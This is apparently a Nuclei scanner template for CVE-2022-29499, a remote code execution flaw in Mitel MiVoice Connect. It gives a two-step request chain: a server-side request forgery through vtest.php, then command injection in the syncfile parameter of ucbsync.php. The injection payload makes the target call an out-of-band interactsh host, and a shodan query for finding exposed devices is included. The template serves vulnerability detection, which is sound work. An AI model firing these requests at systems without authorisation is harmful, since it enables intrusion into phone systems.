id: CVE-2022-29499

info:
  name: Mitel MiVoice Connect - Remote Code Execution
  author: dmartyn
  severity: critical
  description: |
    Mitel MiVoice Connect through 19.2 SP3 contains a remote code execution vulnerability in the Service Appliance component (SA 100, SA 400, and Virtual SA). The exploit chain involves two steps:
    1. First request targets vtest.php with a get_url parameter that points to a local ucbsync.php file
    2. Second request (originating from localhost) to ucbsync.php contains command injection via the syncfile parameter
    
    This vulnerability allows attackers to execute arbitrary commands on the affected system. The exploit is particularly dangerous as it bypasses restrictions that prevent direct external access to the vulnerable endpoint.
  reference:
    - https://www.mitel.com/en-ca/support/security-advisories/mitel-product-security-advisory-22-0002
    - https://www.crowdstrike.com/blog/novel-exploit-detected-in-mitel-voip-appliance/
    - https://arcticwolf.com/resources/blog/lorenz-ransomware-chiseling-in/
    - https://nvd.nist.gov/vuln/detail/CVE-2022-29499
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-20
  metadata:
    verified: "true"
    max-request: 2
    shodan-query: title:"MiVoice Connect"
  tags: cve,cve2022,oast,rce,ssrf,mitel,mivoice,kev

requests:
  - raw:
      - |
        GET /scripts/vtest.php?get_url=http://127.0.0.1/ucbsync.php%3fcmd=syncfile:db_files/favicon.ico:{{interactsh-url}}/%24%50%57%44%7c%73%68%7c%3f HTTP/1.1
        Host: {{Hostname}}
        Accept: */*
        Connection: close

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"

      - type: status
        status:
          - 200

  - raw:
      - |
        GET /ucbsync.php?cmd=syncfile:db_files/favicon.ico:{{interactsh-url}}/$PWD|sh|? HTTP/1.1
        Host: {{Hostname}}
        Accept: */*
        Connection: close

    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"
